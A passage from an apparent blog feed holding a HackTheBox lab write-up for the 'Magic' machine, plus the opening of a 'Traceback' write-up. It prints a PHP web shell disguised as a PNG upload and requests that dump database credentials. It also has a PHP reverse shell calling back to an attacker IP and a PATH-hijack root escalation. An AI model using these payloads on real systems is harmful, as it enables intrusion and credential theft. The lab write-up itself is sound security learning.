&lt;span class="code-line"&gt;&amp;lt;89&amp;gt;PNG&lt;/span&gt;
&lt;span class="code-line"&gt;^Z&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;if(isset($_REQUEST[&amp;#39;cmd&amp;#39;])){&lt;/span&gt;
&lt;span class="code-line"&gt;        echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;;&lt;/span&gt;
&lt;span class="code-line"&gt;        $cmd = ($_REQUEST[&amp;#39;cmd&amp;#39;]);&lt;/span&gt;
&lt;span class="code-line"&gt;        system($cmd);&lt;/span&gt;
&lt;span class="code-line"&gt;        echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;;&lt;/span&gt;
&lt;span class="code-line"&gt;        die;&lt;/span&gt;
&lt;span class="code-line"&gt;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!--    http://michaeldaw.org   2006    --&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------------------1971341748341881315972996739&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Disposition: form-data; name=&amp;quot;submit&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Upload Image&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------------------1971341748341881315972996739--&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This "image" will be uploaded and we can then go to
&lt;code&gt;http://10.10.10.185/images/uploads/simple-backdoor2.php&lt;/code&gt; to execute some
commands on the system.&lt;/p&gt;
&lt;p&gt;We start enumerating and found a &lt;code&gt;db.php5&lt;/code&gt; file containing the database
credentials &lt;code&gt;theseus:iamkingtheseus&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /images/uploads/simple-backdoor2.php.png?cmd=cat+/var/www/Magic/db.php5 HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.10.10.185&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 2&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;HTTP/1.1 200 OK&lt;/span&gt;
&lt;span class="code-line"&gt;Date: Wed, 22 Apr 2020 12:32:22 GMT&lt;/span&gt;
&lt;span class="code-line"&gt;Server: Apache/2.4.29 (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;Vary: Accept-Encoding&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 961&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;89&amp;gt;PNG&lt;/span&gt;
&lt;span class="code-line"&gt;^Z&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;class Database&lt;/span&gt;
&lt;span class="code-line"&gt;{&lt;/span&gt;
&lt;span class="code-line"&gt;    private static $dbName = &amp;#39;Magic&amp;#39; ;&lt;/span&gt;
&lt;span class="code-line"&gt;    private static $dbHost = &amp;#39;localhost&amp;#39; ;&lt;/span&gt;
&lt;span class="code-line"&gt;    private static $dbUsername = &amp;#39;theseus&amp;#39;;&lt;/span&gt;
&lt;span class="code-line"&gt;    private static $dbUserPassword = &amp;#39;iamkingtheseus&amp;#39;;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    private static $cont  = null;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    public function __construct() {&lt;/span&gt;
&lt;span class="code-line"&gt;        die(&amp;#39;Init function is not allowed&amp;#39;);&lt;/span&gt;
&lt;span class="code-line"&gt;    }&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    public static function connect()&lt;/span&gt;
&lt;span class="code-line"&gt;    {&lt;/span&gt;
&lt;span class="code-line"&gt;        // One connection through whole application&lt;/span&gt;
&lt;span class="code-line"&gt;        if ( null == self::$cont )&lt;/span&gt;
&lt;span class="code-line"&gt;        {&lt;/span&gt;
&lt;span class="code-line"&gt;            try&lt;/span&gt;
&lt;span class="code-line"&gt;            {&lt;/span&gt;
&lt;span class="code-line"&gt;                self::$cont =  new PDO( &amp;quot;mysql:host=&amp;quot;.self::$dbHost.&amp;quot;;&amp;quot;.&amp;quot;dbname=&amp;quot;.self::$dbName, self::$dbUsername, self::$dbUserPassword);&lt;/span&gt;
&lt;span class="code-line"&gt;            }&lt;/span&gt;
&lt;span class="code-line"&gt;            catch(PDOException $e)&lt;/span&gt;
&lt;span class="code-line"&gt;            {&lt;/span&gt;
&lt;span class="code-line"&gt;                die($e-&amp;gt;getMessage());&lt;/span&gt;
&lt;span class="code-line"&gt;            }&lt;/span&gt;
&lt;span class="code-line"&gt;        }&lt;/span&gt;
&lt;span class="code-line"&gt;        return self::$cont;&lt;/span&gt;
&lt;span class="code-line"&gt;    }&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    public static function disconnect()&lt;/span&gt;
&lt;span class="code-line"&gt;    {&lt;/span&gt;
&lt;span class="code-line"&gt;        self::$cont = null;&lt;/span&gt;
&lt;span class="code-line"&gt;    }&lt;/span&gt;
&lt;span class="code-line"&gt;}&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then use &lt;code&gt;mysqldump&lt;/code&gt; (which is strangely present on the box) to dump the
content of all databases using the previous credentials. That give us the
credentials for the web login form: &lt;code&gt;admin:Th3s3usW4sK1ng&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /images/uploads/simple-backdoor2.php.png?cmd=mysqldump+-piamkingtheseus+-u+theseus+--all-databases HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.10.10.185&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;HTTP/1.1 200 OK&lt;/span&gt;
&lt;span class="code-line"&gt;Date: Wed, 22 Apr 2020 12:31:35 GMT&lt;/span&gt;
&lt;span class="code-line"&gt;Server: Apache/2.4.29 (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;Vary: Accept-Encoding&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 2201&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;89&amp;gt;PNG&lt;/span&gt;
&lt;span class="code-line"&gt;^Z&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;pre&amp;gt;-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)&lt;/span&gt;
&lt;span class="code-line"&gt;--&lt;/span&gt;
&lt;span class="code-line"&gt;-- Host: localhost    Database:&lt;/span&gt;
&lt;span class="code-line"&gt;-- ------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;-- Server version   5.7.29-0ubuntu0.18.04.1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40101 SET NAMES utf8 */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40103 SET TIME_ZONE=&amp;#39;+00:00&amp;#39; */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&amp;#39;NO_AUTO_VALUE_ON_ZERO&amp;#39; */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--&lt;/span&gt;
&lt;span class="code-line"&gt;-- Current Database: `Magic`&lt;/span&gt;
&lt;span class="code-line"&gt;--&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;CREATE DATABASE /*!32312 IF NOT EXISTS*/ `Magic` /*!40100 DEFAULT CHARACTER SET latin1 */;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;USE `Magic`;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--&lt;/span&gt;
&lt;span class="code-line"&gt;-- Table structure for table `login`&lt;/span&gt;
&lt;span class="code-line"&gt;--&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;DROP TABLE IF EXISTS `login`;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40101 SET @saved_cs_client     = @@character_set_client */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40101 SET character_set_client = utf8 */;&lt;/span&gt;
&lt;span class="code-line"&gt;CREATE TABLE `login` (&lt;/span&gt;
&lt;span class="code-line"&gt;  `id` int(6) NOT NULL AUTO_INCREMENT,&lt;/span&gt;
&lt;span class="code-line"&gt;  `username` varchar(50) NOT NULL,&lt;/span&gt;
&lt;span class="code-line"&gt;  `password` varchar(100) NOT NULL,&lt;/span&gt;
&lt;span class="code-line"&gt;  PRIMARY KEY (`id`),&lt;/span&gt;
&lt;span class="code-line"&gt;  UNIQUE KEY `username` (`username`)&lt;/span&gt;
&lt;span class="code-line"&gt;) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40101 SET character_set_client = @saved_cs_client */;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--&lt;/span&gt;
&lt;span class="code-line"&gt;-- Dumping data for table `login`&lt;/span&gt;
&lt;span class="code-line"&gt;--&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;LOCK TABLES `login` WRITE;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40000 ALTER TABLE `login` DISABLE KEYS */;&lt;/span&gt;
&lt;span class="code-line"&gt;INSERT INTO `login` VALUES (1,&amp;#39;admin&amp;#39;,&amp;#39;Th3s3usW4sK1ng&amp;#39;);&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40000 ALTER TABLE `login` ENABLE KEYS */;&lt;/span&gt;
&lt;span class="code-line"&gt;UNLOCK TABLES;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-- Dump completed on 2020-04-22  5:31:35&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It is time to get a proper shell. We know that PHP is installed on the box (as
the web application is using PHP). So we use a PHP reverse shell and run
&lt;code&gt;nc -l -p 4242&lt;/code&gt; on our side.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /images/uploads/simple-backdoor2.php.png?cmd=php+-r+&amp;#39;$sock%3dfsockopen(&amp;quot;10.10.14.226&amp;quot;,4242)%3bexec(&amp;quot;/bin/sh+-i+&amp;lt;%263+&amp;gt;%263+2&amp;gt;%263&amp;quot;)%3b&amp;#39; HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.10.10.185&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;That will give us a reverse shell as &lt;code&gt;www-data&lt;/code&gt; without interactivity.
Using &lt;code&gt;/usr/bin/script -qc /bin/bash /dev/null&lt;/code&gt; we get a better shell with
interactivity and can simply change user with &lt;code&gt;su theseus&lt;/code&gt; and inputing his
password &lt;code&gt;Th3s3usW4sK1ng&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Then we can grab the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -l -p 4242&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/sh: 0: can&amp;#39;t access tty; job control turned off&lt;/span&gt;
&lt;span class="code-line"&gt;$ /usr/bin/script -qc /bin/bash /dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus&lt;/span&gt;
&lt;span class="code-line"&gt;su theseus&lt;/span&gt;
&lt;span class="code-line"&gt;Password: Th3s3usW4sK1ng&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;theseus@ubuntu:/var/www/Magic/images/uploads$ cat ~/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat ~/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;e0d993fb203a25ba31cee6d8aa2a612f&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;When looking at the SUID files we see that &lt;code&gt;sysinfo&lt;/code&gt; is quit recent.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;theseus@ubuntu:/var/www/Magic/images/uploads$ find / -perm -4000 -type f -exec ls -la {} 2&amp;gt;/dev/null \; | grep -v snap&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;ype f -exec ls -la {} 2&amp;gt;/dev/null \; | grep -v snap&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-- 1 root dip 382696 Feb 11 07:05 /usr/sbin/pppd&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 149080 Jan 31 09:18 /usr/bin/sudo&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 22528 Jun 28  2019 /usr/bin/arping&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 10312 Dec  9 02:03 /usr/bin/vmware-user-suid-wrapper&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-sr-x 1 root root 10232 Dec 18 00:15 /usr/lib/xorg/Xorg.wrap&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 26696 Jan  8 10:31 /bin/umount&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 43088 Jan  8 10:31 /bin/mount&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use &lt;code&gt;ltrace&lt;/code&gt; (also already on the box) to see the binary calls and quickly
saw a call to &lt;code&gt;lshw&lt;/code&gt; using a relative path.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;theseus@ubuntu:/var/www/Magic/images/uploads$ ltrace /bin/sysinfo&lt;/span&gt;
&lt;span class="code-line"&gt;ltrace /bin/sysinfo&lt;/span&gt;
&lt;span class="code-line"&gt;_ZNSt8ios_base4InitC1Ev(0x55b09400e131, 0xffff, 0x7ffef3bfc788, 128) = 0&lt;/span&gt;
&lt;span class="code-line"&gt;__cxa_atexit(0x7f40c551fa40, 0x55b09400e131, 0x55b09400e008, 6) = 0&lt;/span&gt;
&lt;span class="code-line"&gt;setuid(0)                                        = -1&lt;/span&gt;
&lt;span class="code-line"&gt;setgid(0)                                        = -1&lt;/span&gt;
&lt;span class="code-line"&gt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(0x55b09400e020, 0x55b093e0c8f8, -160, 0) = 0x55b09400e020&lt;/span&gt;
&lt;span class="code-line"&gt;_ZNSolsEPFRSoS_E(0x55b09400e020, 0x7f40c558f870, 0x55b09400e020, 0x55b093e0c92d====================Hardware Info====================&lt;/span&gt;
&lt;span class="code-line"&gt;) = 0x55b09400e020&lt;/span&gt;
&lt;span class="code-line"&gt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev(0x7ffef3bfc650, 0x55b093e0c92e, 0, 2880) = 0x7ffef3bfc660&lt;/span&gt;
&lt;span class="code-line"&gt;popen(&amp;quot;lshw -short&amp;quot;, &amp;quot;r&amp;quot;)                        = 0x55b095436280&lt;/span&gt;
&lt;span class="code-line"&gt;fgets(WARNING: you should run this program as super-user.&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;H/W path     Device  Class      &amp;quot;..., 128, 0x563a9c8f6280)                                                                                = 0x7ffe1eb20b70&lt;/span&gt;
&lt;span class="code-line"&gt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffe1eb20c20, 0x7ffe1eb20b70, 0x7ffe1eb20b70, 0x6974706972637365)                  = 0x7ffe1eb20c20&lt;/span&gt;
&lt;span class="code-line"&gt;fgets(&amp;quot;================================&amp;quot;..., 128, 0x563a9c8f6280)                                                                                = 0x7ffe1eb20b70&lt;/span&gt;
&lt;span class="code-line"&gt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffe1eb20c20, 0x7ffe1eb20b70, 0x7ffe1eb20b70, 0x3d3d3d3d3d3d3d3d)                  = 0x7ffe1eb20c20&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So we simply exploit this &lt;code&gt;PATH&lt;/code&gt; vulnerability and get the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;theseus@ubuntu:/var/www/Magic/images/uploads$ cd /tmp/&lt;/span&gt;
&lt;span class="code-line"&gt;cd /tmp/&lt;/span&gt;
&lt;span class="code-line"&gt;theseus@ubuntu:/tmp$ mkdir ioio&lt;/span&gt;
&lt;span class="code-line"&gt;mkdir ioio&lt;/span&gt;
&lt;span class="code-line"&gt;theseus@ubuntu:/tmp$ cd ioio&lt;/span&gt;
&lt;span class="code-line"&gt;cd ioio&lt;/span&gt;
&lt;span class="code-line"&gt;theseus@ubuntu:/tmp/ioio$ echo &amp;#39;cat /root/root.txt&amp;#39; &amp;gt; lshw&lt;/span&gt;
&lt;span class="code-line"&gt;echo &amp;#39;cat /root/root.txt&amp;#39; &amp;gt; lshw&lt;/span&gt;
&lt;span class="code-line"&gt;theseus@ubuntu:/tmp/ioio$ PATH=./:$PATH&lt;/span&gt;
&lt;span class="code-line"&gt;PATH=./:$PATH&lt;/span&gt;
&lt;span class="code-line"&gt;theseus@ubuntu:/tmp/ioio$ chmod +x lshw&lt;/span&gt;
&lt;span class="code-line"&gt;chmod +x lshw&lt;/span&gt;
&lt;span class="code-line"&gt;theseus@ubuntu:/tmp/ioio$ sysinfo&lt;/span&gt;
&lt;span class="code-line"&gt;sysinfo&lt;/span&gt;
&lt;span class="code-line"&gt;====================Hardware Info====================&lt;/span&gt;
&lt;span class="code-line"&gt;a06f37dc581bc81a9e688040af40daaf&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;====================Disk Info====================&lt;/span&gt;
&lt;span class="code-line"&gt;Disk /dev/loop0: 44.9 MiB, 47063040 bytes, 91920 sectors&lt;/span&gt;
&lt;span class="code-line"&gt;Units: sectors of 1 * 512 = 512 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;Sector size (logical/physical): 512 bytes / 512 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;I/O size (minimum/optimal): 512 bytes / 512 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Disk /dev/loop1: 149.9 MiB, 157192192 bytes, 307016 sectors&lt;/span&gt;
&lt;span class="code-line"&gt;Units: sectors of 1 * 512 = 512 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;Sector size (logical/physical): 512 bytes / 512 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;I/O size (minimum/optimal): 512 bytes / 512 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;(The flag is in the &lt;code&gt;Hardware Info&lt;/code&gt; part in the first lines of the &lt;code&gt;sysinfo&lt;/code&gt; output.)&lt;/p&gt;
&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;Quit an easy but pleasant box. I will recommend this box to beginners as I
really enjoyed it.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="Upload"></category><category term="SUID"></category><category term="SQLi"></category></entry><entry><title>HTB: Traceback</title><link href="https://maggick.fr/2020/08/htb-traceback.html" rel="alternate"></link><published>2020-08-19T09:00:00+02:00</published><updated>2020-08-19T09:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-08-19:/2020/08/htb-traceback.html</id><summary type="html">&lt;p&gt;&lt;img alt="Traceback Card" class="align-left" src="/media/2020.08/traceback_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/233"&gt;Traceback&lt;/a&gt; publish on
Mars the 14th 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/21439"&gt;Xh4H&lt;/a&gt;.
This box is rated as easy box. It implies some Google search, a lua interpreter
and a privilege escalation using the MOTD.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.08/traceback_card.png" alt="Traceback Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/233"&gt;Traceback&lt;/a&gt; publish on
Mars the 14th 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/21439"&gt;Xh4H&lt;/a&gt;.
This box is rated as easy box. It implies some Google search, a lua interpreter
and a privilege escalation using the MOTD.&lt;/p&gt;


&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. The box is quit busy so first of all we
run a simple aggressive TCP scan:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Thu Mar 26 04:41:18 2020 as: nmap -p- -sS -oN nmap 10.10.10.181&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.181&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.089s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
